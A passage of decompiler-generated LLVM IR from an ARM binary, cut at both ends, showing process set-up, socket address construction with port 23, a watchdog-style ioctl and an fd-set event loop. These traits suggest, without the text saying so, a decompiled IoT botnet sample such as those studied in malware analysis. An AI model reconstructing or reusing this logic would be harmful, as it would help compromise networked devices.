  br i1 %v2_d828, label %dec_label_pc_d840, label %dec_label_pc_d834

dec_label_pc_d834:                                ; preds = %dec_label_pc_d800
  store i32 %v3_d800, i32* @r4, align 4
  store i32 %v6_d800, i32* @r5, align 4
  store i32 %v9_d800, i32* @lr, align 4
  ret i32 %v0_d808

dec_label_pc_d840:                                ; preds = %dec_label_pc_d800
  store i32 1, i32* %stack_var_-20, align 4
  %v1_d84c = call i32 @function_fd64(i32 26)
  %v1_d854 = call i32 @function_fd64(i32 27)
  %v0_d858 = load i32, i32* @r5, align 4
  %v2_d860 = inttoptr i32 %v0_d858 to i32*
  %v3_d860 = call i32 @function_fca0(i32 26, i32* %v2_d860)
  %v2_d868 = call i32 @function_109e8(i32 %v3_d860, i32 2)
  %v7_d86c = icmp eq i32 %v2_d868, -1
  store i32 %v2_d868, i32* @r4, align 4
  br i1 %v7_d86c, label %dec_label_pc_d8b4, label %dec_label_pc_d878

dec_label_pc_d878:                                ; preds = %dec_label_pc_d8b4, %dec_label_pc_d840
  %v0_d884 = phi i32 [ %v3_d8c4, %dec_label_pc_d8b4 ], [ %v2_d868, %dec_label_pc_d840 ]
  %v2_d888 = ptrtoint i32* %stack_var_-20 to i32
  %v3_d88c = call i32 @function_10d50(i32 %v0_d884, i32 -2147199228, i32 %v2_d888)
  br label %dec_label_pc_d890

dec_label_pc_d890:                                ; preds = %dec_label_pc_d890, %dec_label_pc_d878
  %v0_d89c = load i32, i32* @r4, align 4
  %v3_d8a4 = call i32 @function_10d50(i32 %v0_d89c, i32 -2147199227, i32 0)
  %v1_d8ac = call i32 @function_12f00(i32 10)
  br label %dec_label_pc_d890

dec_label_pc_d8b4:                                ; preds = %dec_label_pc_d840
  %v0_d8b4 = load i32, i32* @r5, align 4
  %v2_d8bc = inttoptr i32 %v0_d8b4 to i32*
  %v3_d8bc = call i32 @function_fca0(i32 27, i32* %v2_d8bc)
  %v3_d8c4 = call i32 @function_109e8(i32 %v3_d8bc, i32 2)
  %v3_d8c8 = icmp eq i32 %v3_d8c4, -1
  store i32 %v3_d8c4, i32* @r4, align 4
  br i1 %v3_d8c8, label %dec_label_pc_d8d4, label %dec_label_pc_d878

dec_label_pc_d8d4:                                ; preds = %dec_label_pc_d8b4
  %v1_d8d8 = call i32 @function_fcc4(i32 26)
  %v1_d8e0 = call i32 @function_fcc4(i32 27)
  %v0_d8e4 = load i32, i32* @r5, align 4
  %v1_d8e8 = call i32 @function_12e48(i32 %v0_d8e4)
  %v0_d8ec = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d8ec, label %bb14, label %bb15

bb14:                                             ; preds = %dec_label_pc_d8d4
  %v4_d8ec = load i64, i64* inttoptr (i32 2 to i64*), align 4
  %v6_d8ec = trunc i64 %v4_d8ec to i32
  %v7_d8ec = udiv i64 %v4_d8ec, 4294967296
  %v8_d8ec = trunc i64 %v7_d8ec to i32
  store i32 %v8_d8ec, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v6_d8ec)
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_d8d4, %bb14
  ret i32 %v1_d8e8

; uselistorder directives
  uselistorder i32 %v3_d8c4, { 1, 2, 0 }
  uselistorder i32 %v2_d868, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_d808, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @function_d8f0(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_d8f0:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-1432 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v15_d8f0 = load i32, i32* @r8, align 4
  %v2_d900 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_d900, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_d918 = call i32 @function_1168c(i32* nonnull %stack_var_-64)
  store i32 %v2_d900, i32* @r0, align 4
  %v2_d924 = call i32 @function_11648(i32 %v2_d900, i32 2)
  %v0_d928 = load i32, i32* @r5, align 4
  store i32 %v0_d928, i32* %r2.global-to-local, align 4
  %v3_d934 = call i32 @function_10da4(i32 %v0_d928, i32 %v2_d900, i32 %v0_d928)
  %v2_d940 = call i32 @function_116a0(i32 17, i32 1)
  %v2_d94c = call i32 @function_116a0(i32 5, i32 54844)
  %v0_d950 = call i32 @function_105d8()
  store i32 ptrtoint (i16** @global_var_20a68.77 to i32), i32* %r2.global-to-local, align 4
  store i32 1494907824, i32* @global_var_20a6c.78, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i32 5888, i32* %r3.global-to-local, align 4
  store i32 %v0_d950, i32* @global_var_20a5c.46, align 4
  store i16 5888, i16* bitcast (i32* @global_var_20a6a.79 to i16*), align 4
  store i16 2, i16* bitcast (i16** @global_var_20a68.77 to i16*), align 4
  %v6_d978 = call i32 @function_fe04(i32 %v0_d950, i32 ptrtoint (i32* @global_var_20a5c.46 to i32), i32 ptrtoint (i16** @global_var_20a68.77 to i32), i32 5888)
  store i32 ptrtoint (i32* @global_var_d7b8.69 to i32), i32* %r3.global-to-local, align 4
  store i32 124944, i32* @lr, align 4
  %v2_d984 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_d984, i32* @sb, align 4
  store i32 ptrtoint (i32* @global_var_d7b8.69 to i32), i32* inttoptr (i32 124944 to i32*), align 16
  %v1_d98c = call i32 @function_d654(i32 %v6_d978)
  %v1_d990 = call i32 @function_e114(i32 %v1_d98c)
  store i32 %v2_d984, i32* @r0, align 4
  store i32 32, i32* @r1, align 4
  %v0_d99c = call i32 @function_103b0()
  %v0_d9a0 = load i32, i32* @r6, align 4
  %v7_d9a0 = icmp eq i32 %v0_d9a0, 2
  br i1 %v7_d9a0, label %dec_label_pc_dad0, label %dec_label_pc_d9a8

dec_label_pc_d9a8:                                ; preds = %dec_label_pc_dad0, %dec_label_pc_d8f0, %dec_label_pc_dae0
  %v0_d9a8 = call i32 @function_e0b8()
  store i32 %v0_d9a8, i32* @r6, align 4
  %v0_d9b0 = load i32, i32* @r8, align 4
  %v1_d9b0 = inttoptr i32 %v0_d9b0 to i32*
  %v2_d9b0 = load i32, i32* %v1_d9b0, align 4
  %v1_d9b4 = inttoptr i32 %v2_d9b0 to i8*
  %v2_d9b4 = call i32 @function_1031c(i8* %v1_d9b4)
  %v0_d9bc = load i32, i32* @r8, align 4
  %v1_d9bc = inttoptr i32 %v0_d9bc to i32*
  %v2_d9bc = load i32, i32* %v1_d9bc, align 4
  %v1_d9c0 = inttoptr i32 %v2_d9bc to i8*
  %v2_d9c0 = call i32 @function_1031c(i8* %v1_d9c0)
  %v1_d9c4 = sub i32 20, %v2_d9b4
  store i32 %v2_d9c0, i32* @r4, align 4
  %v0_d9cc = load i32, i32* @r6, align 4
  %v2_d9d0 = call i32 @function_10974(i32 %v0_d9cc, i32 %v1_d9c4)
  %v2_d9d4 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_d9d4, i32* @r5, align 4
  %v0_d9d8 = load i32, i32* @r4, align 4
  %v2_d9d8 = add i32 %v0_d9d8, %v1_d9c4
  store i32 %v2_d9d8, i32* @r4, align 4
  %v2_d9e4 = call i32 @function_e17c(i32 %v2_d9d4, i32 %v2_d9d8)
  %v2_d9e8 = ptrtoint i32* %stack_var_-40 to i32
  %v1_d9ec = load i32, i32* @r4, align 4
  %v2_d9ec = add i32 %v1_d9ec, %v2_d9e8
  store i32 %v2_d9ec, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  %v0_d9f8 = load i32, i32* @r8, align 4
  %v1_d9f8 = inttoptr i32 %v0_d9f8 to i32*
  %v2_d9f8 = load i32, i32* %v1_d9f8, align 4
  store i32 %v2_d9f8, i32* @r0, align 4
  %v3_d9fc = add i32 %v2_d9ec, -80
  %v4_d9fc = inttoptr i32 %v3_d9fc to i8*
  store i8 0, i8* %v4_d9fc, align 1
  %v2_da00 = inttoptr i32 %v2_d9f8 to i8*
  %v3_da00 = call i32 @function_10344(i8* %v2_da00, i32 %v2_d9d4)
  store i32 32, i32* @r1, align 4
  store i32 %v2_d9d4, i32* @r0, align 4
  %v0_da0c = call i32 @function_103b0()
  %v0_da10 = call i32 @function_e0b8()
  store i32 %v0_da10, i32* @r7, align 4
  %v0_da18 = load i32, i32* @r8, align 4
  %v1_da18 = inttoptr i32 %v0_da18 to i32*
  %v2_da18 = load i32, i32* %v1_da18, align 4
  %v1_da1c = inttoptr i32 %v2_da18 to i8*
  %v2_da1c = call i32 @function_1031c(i8* %v1_da1c)
  store i32 %v2_da1c, i32* @r6, align 4
  %v0_da24 = load i32, i32* @r8, align 4
  %v1_da24 = inttoptr i32 %v0_da24 to i32*
  %v2_da24 = load i32, i32* %v1_da24, align 4
  %v1_da28 = inttoptr i32 %v2_da24 to i8*
  %v2_da28 = call i32 @function_1031c(i8* %v1_da28)
  %v0_da2c = load i32, i32* @r6, align 4
  %v1_da2c = sub i32 20, %v0_da2c
  store i32 %v2_da28, i32* @r4, align 4
  %v0_da34 = load i32, i32* @r7, align 4
  %v2_da38 = call i32 @function_10974(i32 %v0_da34, i32 %v1_da2c)
  %v0_da3c = load i32, i32* @r4, align 4
  %v2_da3c = add i32 %v0_da3c, %v1_da2c
  store i32 %v2_da3c, i32* @r4, align 4
  %v2_da48 = call i32 @function_e17c(i32 %v2_d9d4, i32 %v2_da3c)
  store i32 %v2_d9e8, i32* %r2.global-to-local, align 4
  %v1_da50 = load i32, i32* @r4, align 4
  %v2_da50 = add i32 %v1_da50, %v2_d9e8
  store i32 %v2_da50, i32* %r3.global-to-local, align 4
  %v0_da54 = load i32, i32* @sl, align 4
  %v1_da54 = trunc i32 %v0_da54 to i8
  %v3_da54 = add i32 %v2_da50, -80
  %v4_da54 = inttoptr i32 %v3_da54 to i8*
  store i8 %v1_da54, i8* %v4_da54, align 1
  %v4_da60 = call i32 @function_10a8c(i32 15, i32 %v2_d9d4, i32 %v2_d9e8, i32 %v2_da50)
  %v1_da68 = call i32 @function_fd64(i32 5)
  %v3_da78 = call i32 @function_fca0(i32 5, i32* nonnull %stack_var_-48)
  %v3_da7c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_da7c, i32* %r2.global-to-local, align 4
  %v2_da88 = call i32 @function_10ce8(i32 1, i32 %v3_da78)
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_da98 = call i32 @function_10ce8(i32 1, i32 ptrtoint (i32* @global_var_16190.89 to i32))
  %v1_daa0 = call i32 @function_fcc4(i32 5)
  %v1_daa4 = call i32 @function_85e0(i32 %v1_daa0)
  %v1_daa8 = call i32 @function_cef8(i32 %v1_daa4)
  store i32 %v1_daa8, i32* @r0, align 4
  %v1_daac = call i32 @function_d800(i32 %v1_daa8)
  store i32 %v1_daac, i32* @r0, align 4
  %v0_dab0 = call i32 @function_10acc()
  %v1_dab4 = load i32, i32* @sl, align 4
  %v7_dab8 = icmp sgt i32 %v0_dab0, %v1_dab4
  br i1 %v7_dab8, label %dec_label_pc_dabc, label %dec_label_pc_db08

dec_label_pc_dabc:                                ; preds = %dec_label_pc_d9a8
  store i32 %v15_d8f0, i32* %r8.global-to-local, align 4
  ret i32 %v1_dab4

dec_label_pc_dad0:                                ; preds = %dec_label_pc_d8f0
  %v0_dad0 = load i32, i32* @r8, align 4
  %v1_dad0 = add i32 %v0_dad0, 4
  %v2_dad0 = inttoptr i32 %v1_dad0 to i32*
  %v3_dad0 = load i32, i32* %v2_dad0, align 4
  %v1_dad4 = inttoptr i32 %v3_dad0 to i8*
  %v2_dad4 = call i32 @function_1031c(i8* %v1_dad4)
  %v8_dadc = icmp sgt i32 %v2_dad4, 31
  br i1 %v8_dadc, label %dec_label_pc_d9a8, label %dec_label_pc_dae0

dec_label_pc_dae0:                                ; preds = %dec_label_pc_dad0
  %v0_dae0 = load i32, i32* @r8, align 4
  %v1_dae0 = add i32 %v0_dae0, 4
  %v2_dae0 = inttoptr i32 %v1_dae0 to i32*
  %v3_dae0 = load i32, i32* %v2_dae0, align 4
  store i32 %v2_d984, i32* @r0, align 4
  %v2_dae8 = bitcast i32* %stack_var_-152 to i8*
  %v3_dae8 = call i32 @function_10344(i8* %v2_dae8, i32 %v3_dae0)
  %v0_daec = load i32, i32* @r8, align 4
  %v1_daec = add i32 %v0_daec, 4
  %v2_daec = inttoptr i32 %v1_daec to i32*
  %v3_daec = load i32, i32* %v2_daec, align 4
  %v1_daf4 = inttoptr i32 %v3_daec to i8*
  %v2_daf4 = call i32 @function_1031c(i8* %v1_daf4)
  store i32 %v2_daf4, i32* @r1, align 4
  store i32 %v3_daec, i32* @r0, align 4
  %v0_db00 = call i32 @function_103b0()
  br label %dec_label_pc_d9a8

dec_label_pc_db08:                                ; preds = %dec_label_pc_d9a8
  %v1_db08 = call i32 @function_10d1c(i32 %v0_dab0)
  %v0_db10 = load i32, i32* @sl, align 4
  %v1_db14 = call i32 @function_10ddc(i32 %v0_db10)
  %v1_db1c = call i32 @function_10ddc(i32 1)
  %v1_db24 = call i32 @function_10ddc(i32 2)
  store i32 124940, i32* @fp, align 4
  %v1_db2c = call i32 @function_85e0(i32 %v1_db24)
  %v1_db30 = call i32 @function_cef8(i32 %v1_db2c)
  store i32 %v1_db30, i32* @r0, align 4
  %v1_db34 = call i32 @function_d800(i32 %v1_db30)
  store i32 %v1_db34, i32* @r0, align 4
  %v1_db38 = call i32 @function_e550(i32 %v1_db34)
  %v0_db3c = load i32, i32* @sl, align 4
  %v2_db40 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_db40, i32* @r7, align 4
  %v2_db44 = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v2_db44, i32* @r6, align 4
  %v2_dc24 = ptrtoint i32* %stack_var_-72 to i32
  %v2_dc74 = ptrtoint i32* %stack_var_-168 to i32
  %v2_de50 = ptrtoint i32* %stack_var_-56 to i32
  %v2_de58 = ptrtoint i8** %stack_var_-42 to i32
  %v2_dffc = ptrtoint i32* %stack_var_-1432 to i32
  %v2_de74 = ptrtoint i32* %stack_var_-52 to i32
  %v1_df24 = bitcast i32* %stack_var_-152 to i8*
  %v2_dee8 = ptrtoint i32* %stack_var_-88 to i32
  %v1_df00 = sub i32 0, %v1_db08
  br label %dec_label_pc_db48

dec_label_pc_db48:                                ; preds = %dec_label_pc_df84, %dec_label_pc_e020, %bb43, %dec_label_pc_df20, %dec_label_pc_dd58, %dec_label_pc_dd48, %bb40, %dec_label_pc_e074, %dec_label_pc_dfe0, %dec_label_pc_df94, %dec_label_pc_df70, %dec_label_pc_dea0, %dec_label_pc_ddc8, %dec_label_pc_dd00, %dec_label_pc_db08
  %stack_var_-1436.0 = phi i32 [ %v0_db3c, %dec_label_pc_db08 ], [ %stack_var_-1436.0, %bb40 ], [ %stack_var_-1436.1, %dec_label_pc_dd48 ], [ %stack_var_-1436.1, %dec_label_pc_dd58 ], [ %stack_var_-1436.1, %bb43 ], [ %stack_var_-1436.1, %dec_label_pc_df94 ], [ %stack_var_-1436.1, %dec_label_pc_ddc8 ], [ %stack_var_-1436.1, %dec_label_pc_e020 ], [ %stack_var_-1436.1, %dec_label_pc_e074 ], [ %stack_var_-1436.1, %dec_label_pc_dfe0 ], [ %stack_var_-1436.1, %dec_label_pc_dd00 ], [ %stack_var_-1436.1, %dec_label_pc_df20 ], [ %stack_var_-1436.1, %dec_label_pc_df70 ], [ %stack_var_-1436.1, %dec_label_pc_dea0 ], [ %stack_var_-1436.1, %dec_label_pc_df84 ]
  store i32 0, i32* %stack_var_-280, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_db54

dec_label_pc_db54:                                ; preds = %dec_label_pc_db54, %dec_label_pc_db48
  %v1_db58 = phi i32 [ %v1_db5c, %dec_label_pc_db54 ], [ 4, %dec_label_pc_db48 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_db58 = load i32, i32* @r7, align 4
  %v3_db58 = add i32 %v2_db58, %v1_db58
  %v4_db58 = inttoptr i32 %v3_db58 to i32*
  store i32 0, i32* %v4_db58, align 4
  %v0_db5c = load i32, i32* %r3.global-to-local, align 4
  %v1_db5c = add i32 %v0_db5c, 4
  store i32 %v1_db5c, i32* %r3.global-to-local, align 4
  %v7_db60 = icmp eq i32 %v1_db5c, 128
  br i1 %v7_db60, label %dec_label_pc_db68, label %dec_label_pc_db54

dec_label_pc_db68:                                ; preds = %dec_label_pc_db54
  %v0_db68 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_db68, i32* %stack_var_-408, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_db70

dec_label_pc_db70:                                ; preds = %dec_label_pc_db70, %dec_label_pc_db68
  %v1_db74 = phi i32 [ %v1_db78, %dec_label_pc_db70 ], [ 4, %dec_label_pc_db68 ]
  store i32 0, i32* @r4, align 4
  %v2_db74 = load i32, i32* @r6, align 4
  %v3_db74 = add i32 %v2_db74, %v1_db74
  %v4_db74 = inttoptr i32 %v3_db74 to i32*
  store i32 0, i32* %v4_db74, align 4
  %v0_db78 = load i32, i32* %r3.global-to-local, align 4
  %v1_db78 = add i32 %v0_db78, 4
  store i32 %v1_db78, i32* %r3.global-to-local, align 4
  %v7_db7c = icmp eq i32 %v1_db78, 128
  br i1 %v7_db7c, label %dec_label_pc_db84, label %dec_label_pc_db70

dec_label_pc_db84:                                ; preds = %dec_label_pc_db70
  store i32 124936, i32* %r3.global-to-local, align 4
  %v2_db88 = load i32, i32* inttoptr (i32 124936 to i32*), align 8
  %v7_db8c = icmp eq i32 %v2_db88, -1
  br i1 %v7_db8c, label %dec_label_pc_dbb8, label %dec_label_pc_db94

dec_label_pc_db94:                                ; preds = %dec_label_pc_db84
  %v3_db94 = udiv i32 %v2_db88, 32
  %v3_db98 = mul nuw nsw i32 %v3_db94, 4
  store i32 %v2_d9e8, i32* %ip.global-to-local, align 4
  %v2_dba0 = add i32 %v3_db98, %v2_d9e8
  store i32 %v2_dba0, i32* %r3.global-to-local, align 4
  %v1_dba4 = add i32 %v2_dba0, -240
  %v2_dba4 = inttoptr i32 %v1_dba4 to i32*
  %v3_dba4 = load i32, i32* %v2_dba4, align 4
  %v1_dba8 = urem i32 %v2_db88, 32
  %v7_dbb0 = shl i32 1, %v1_dba8
  %v8_dbb0 = or i32 %v3_dba4, %v7_dbb0
  store i32 %v8_dbb0, i32* %r2.global-to-local, align 4
  store i32 %v8_dbb0, i32* %v2_dba4, align 4
  br label %dec_label_pc_dbb8

dec_label_pc_dbb8:                                ; preds = %dec_label_pc_db84, %dec_label_pc_db94
  %v0_dbb8 = load i32, i32* @fp, align 4
  %v1_dbb8 = inttoptr i32 %v0_dbb8 to i32*
  %v2_dbb8 = load i32, i32* %v1_dbb8, align 4
  store i32 %v2_dbb8, i32* @r3, align 4
  %v7_dbbc = icmp eq i32 %v2_dbb8, -1
  store i32 124940, i32* %r8.global-to-local, align 4
  br i1 %v7_dbbc, label %dec_label_pc_dde0, label %dec_label_pc_dbc8

dec_label_pc_dbc8:                                ; preds = %dec_label_pc_dde0, %dec_label_pc_dbb8, %bb42
  %v2_dbcc = load i8, i8* bitcast (i8** @global_var_1e9e0.93 to i8*), align 4
  %v3_dbcc = zext i8 %v2_dbcc to i32
  store i32 %v3_dbcc, i32* %r3.global-to-local, align 4
  %v2_dbd0 = icmp eq i8 %v2_dbcc, 0
  %v0_dd1c = load i32, i32* @fp, align 4
  %v1_dd1c = inttoptr i32 %v0_dd1c to i32*
  %v2_dd1c = load i32, i32* %v1_dd1c, align 4
  store i32 %v2_dd1c, i32* %ip.global-to-local, align 4
  %v3_dd20 = udiv i32 %v2_dd1c, 32
  store i32 %v3_dd20, i32* %r3.global-to-local, align 4
  br i1 %v2_dbd0, label %dec_label_pc_dd1c, label %dec_label_pc_dbd8

dec_label_pc_dbd8:                                ; preds = %dec_label_pc_dbc8
  %v3_dbe4 = mul nuw nsw i32 %v3_dd20, 4
  %v2_dbe8 = add i32 %v3_dbe4, %v2_d9e8
  store i32 %v2_dbe8, i32* %r3.global-to-local, align 4
  %v1_dbec = add i32 %v2_dbe8, -368
  %v2_dbec = inttoptr i32 %v1_dbec to i32*
  %v3_dbec = load i32, i32* %v2_dbec, align 4
  %v1_dbf0 = urem i32 %v2_dd1c, 32
  %v7_dbf8 = shl i32 1, %v1_dbf0
  %v8_dbf8 = or i32 %v3_dbec, %v7_dbf8
  store i32 %v8_dbf8, i32* %r2.global-to-local, align 4
  store i32 %v8_dbf8, i32* %v2_dbec, align 4
  br label %dec_label_pc_dc00

dec_label_pc_dc00:                                ; preds = %dec_label_pc_dd1c, %dec_label_pc_dbd8
  store i32 124936, i32* %r3.global-to-local, align 4
  %v2_dc04 = load i32, i32* inttoptr (i32 124936 to i32*), align 8
  store i32 0, i32* @lr, align 4
  %v0_dc0c = load i32, i32* %ip.global-to-local, align 4
  %v5_dc10 = icmp slt i32 %v0_dc0c, %v2_dc04
  br i1 %v5_dc10, label %bb40, label %bb

bb:                                               ; preds = %dec_label_pc_dc00
  br label %bb40

bb40:                                             ; preds = %dec_label_pc_dc00, %bb
  %v0_dc20 = phi i32 [ %v2_dc04, %dec_label_pc_dc00 ], [ %v0_dc0c, %bb ]
  store i32 10, i32* %stack_var_-72, align 4
  %v1_dc20 = add i32 %v0_dc20, 1
  store i32 %v2_dc24, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_db44, i32* %r2.global-to-local, align 4
  %v5_dc3c = call i32 @function_10b00(i32 %v1_dc20, i32 %v2_db40, i32 %v2_db44, i32 0, i32 %v2_dc24)
  %v8_dc40 = icmp eq i32 %v5_dc3c, -1
  br i1 %v8_dc40, label %dec_label_pc_db48, label %dec_label_pc_dc48

dec_label_pc_dc48:                                ; preds = %bb40
  %v6_dc3c = trunc i32 %v5_dc3c to i16
  %v3_dc48 = icmp eq i16 %v6_dc3c, 0
  br i1 %v3_dc48, label %dec_label_pc_dc50, label %dec_label_pc_dc84

dec_label_pc_dc50:                                ; preds = %dec_label_pc_dc48
  %v5_dc5c = srem i32 %stack_var_-1436.0, 6
  %v4_dc64 = sub i32 %stack_var_-1436.0, %v5_dc5c
  store i32 %v4_dc64, i32* %r3.global-to-local, align 4
  %v2_dc6c = icmp eq i32 %v5_dc5c, 0
  %v1_dc70 = add i32 %stack_var_-1436.0, 1
  store i32 %v1_dc70, i32* @lr, align 4
  store i32 %v2_dc74, i32* %r2.global-to-local, align 4
  %v7_dc78 = inttoptr i32 %v5_dc3c to i8*
  store i8* %v7_dc78, i8** %stack_var_-42, align 4
  br i1 %v2_dc6c, label %dec_label_pc_de50, label %dec_label_pc_dc84

dec_label_pc_dc84:                                ; preds = %dec_label_pc_dc48, %dec_label_pc_dc50, %dec_label_pc_de50
  %stack_var_-1436.1 = phi i32 [ %v1_dc70, %dec_label_pc_de50 ], [ %v1_dc70, %dec_label_pc_dc50 ], [ %stack_var_-1436.0, %dec_label_pc_dc48 ]
  store i32 124936, i32* %r3.global-to-local, align 4
  %v2_dc88 = load i32, i32* inttoptr (i32 124936 to i32*), align 8
  %v7_dc8c = icmp eq i32 %v2_dc88, -1
  br i1 %v7_dc8c, label %dec_label_pc_dcb8, label %dec_label_pc_dc94

dec_label_pc_dc94:                                ; preds = %dec_label_pc_dc84
  %v3_dc94 = udiv i32 %v2_dc88, 32
  %v3_dc98 = mul nuw nsw i32 %v3_dc94, 4
  store i32 %v2_d9e8, i32* %ip.global-to-local, align 4
  %v2_dca0 = add i32 %v3_dc98, %v2_d9e8
  store i32 %v2_dca0, i32* %r3.global-to-local, align 4
  %v1_dca4 = add i32 %v2_dca0, -240
  %v2_dca4 = inttoptr i32 %v1_dca4 to i32*
  %v3_dca4 = load i32, i32* %v2_dca4, align 4
  %v1_dca8 = urem i32 %v2_dc88, 32
  %v6_dcac = lshr i32 %v3_dca4, %v1_dca8
  store i32 %v6_dcac, i32* %r2.global-to-local, align 4
  %v1_dcb0 = urem i32 %v6_dcac, 2
  %v2_dcb0 = icmp eq i32 %v1_dcb0, 0
  br i1 %v2_dcb0, label %dec_label_pc_dcb8, label %dec_label_pc_dedc

dec_label_pc_dcb8:                                ; preds = %dec_label_pc_dc94, %dec_label_pc_dc84
  %v2_dcbc = load i8, i8* bitcast (i8** @global_var_1e9e0.93 to i8*), align 4
  %v3_dcbc = zext i8 %v2_dcbc to i32
  store i32 %v3_dcbc, i32* @r4, align 4
  %v2_dcc0 = icmp eq i8 %v2_dcbc, 0
  %v0_dd48 = load i32, i32* @fp, align 4
  %v1_dd48 = inttoptr i32 %v0_dd48 to i32*
  %v2_dd48 = load i32, i32* %v1_dd48, align 4
  br i1 %v2_dcc0, label %dec_label_pc_dd48, label %dec_label_pc_dcc8

dec_label_pc_dcc8:                                ; preds = %dec_label_pc_dcb8
  %v3_dccc = udiv i32 %v2_dd48, 32
  store i32 %v2_d9e8, i32* %r2.global-to-local, align 4
  %v3_dcd4 = mul nuw nsw i32 %v3_dccc, 4
  %v2_dcd8 = add i32 %v3_dcd4, %v2_d9e8
  store i32 %v2_dcd8, i32* %r3.global-to-local, align 4
  %v1_dcdc = add i32 %v2_dcd8, -368
  %v2_dcdc = inttoptr i32 %v1_dcdc to i32*
  %v3_dcdc = load i32, i32* %v2_dcdc, align 4
  %v1_dce0 = urem i32 %v2_dd48, 32
  %v6_dce4 = lshr i32 %v3_dcdc, %v1_dce0
  store i32 %v6_dce4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1e9e0.93 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_dcf0 = urem i32 %v6_dce4, 2
  %v2_dcf0 = icmp eq i32 %v1_dcf0, 0
  store i8 0, i8* bitcast (i8** @global_var_1e9e0.93 to i8*), align 4
  store i32 124940, i32* @r5, align 4
  br i1 %v2_dcf0, label %dec_label_pc_dd00, label %dec_label_pc_de6c

dec_label_pc_dd00:                                ; preds = %dec_label_pc_dcc8
  store i32 56584, i32* @lr, align 4
  %v1_dd04 = icmp ne i32 %v2_dd48, -1
  call void @__pseudo_cond_branch(i1 %v1_dd04, i32 ptrtoint (i32* @global_var_10ddc.95 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_dd0c = load i32, i32* @r5, align 4
  %v2_dd0c = inttoptr i32 %v1_dd0c to i32*
  store i32 -1, i32* %v2_dd0c, align 4
  %v1_dd14 = call i32 @function_12f00(i32 1)
  br label %dec_label_pc_db48

dec_label_pc_dd1c:                                ; preds = %dec_label_pc_dbc8
  store i32 %v2_d9e8, i32* %r2.global-to-local, align 4
  %v3_dd28 = mul nuw nsw i32 %v3_dd20, 4
  %v2_dd2c = add i32 %v3_dd28, %v2_d9e8
  store i32 %v2_dd2c, i32* %r3.global-to-local, align 4
  %v1_dd30 = add i32 %v2_dd2c, -240
  %v2_dd30 = inttoptr i32 %v1_dd30 to i32*
  %v3_dd30 = load i32, i32* %v2_dd30, align 4
  %v1_dd34 = urem i32 %v2_dd1c, 32
  %v7_dd3c = shl i32 1, %v1_dd34
  %v8_dd3c = or i32 %v3_dd30, %v7_dd3c
  store i32 %v8_dd3c, i32* %r2.global-to-local, align 4
  store i32 %v8_dd3c, i32* %v2_dd30, align 4
  br label %dec_label_pc_dc00

dec_label_pc_dd48:                                ; preds = %dec_label_pc_dcb8
  %v7_dd4c = icmp eq i32 %v2_dd48, -1
  store i32 124940, i32* @r8, align 4
  br i1 %v7_dd4c, label %dec_label_pc_db48, label %dec_label_pc_dd58

dec_label_pc_dd58:                                ; preds = %dec_label_pc_dd48
  %v3_dd58 = udiv i32 %v2_dd48, 32
  store i32 %v2_d9e8, i32* %r2.global-to-local, align 4
  %v3_dd60 = mul nuw nsw i32 %v3_dd58, 4
  %v2_dd64 = add i32 %v3_dd60, %v2_d9e8
  store i32 %v2_dd64, i32* %r3.global-to-local, align 4
  %v1_dd68 = add i32 %v2_dd64, -240
  %v2_dd68 = inttoptr i32 %v1_dd68 to i32*
  %v3_dd68 = load i32, i32* %v2_dd68, align 4
  %v1_dd6c = urem i32 %v2_dd48, 32
  %v6_dd70 = lshr i32 %v3_dd68, %v1_dd6c
  store i32 %v6_dd70, i32* %r2.global-to-local, align 4
  %v1_dd74 = urem i32 %v6_dd70, 2
  %v2_dd74 = icmp eq i32 %v1_dd74, 0
  br i1 %v2_dd74, label %dec_label_pc_db48, label %dec_label_pc_dd7c

dec_label_pc_dd7c:                                ; preds = %dec_label_pc_dd58
  %v6_dd80 = inttoptr i32 %v3_dcbc to i8*
  store i8* %v6_dd80, i8** %stack_var_-42, align 4
  store i32 %v2_de58, i32* @sl, align 4
  %v0_dd84 = call i32 @function_11204()
  %v0_dd88 = load i32, i32* @r4, align 4
  %v2_dd88 = inttoptr i32 %v0_dd84 to i32*
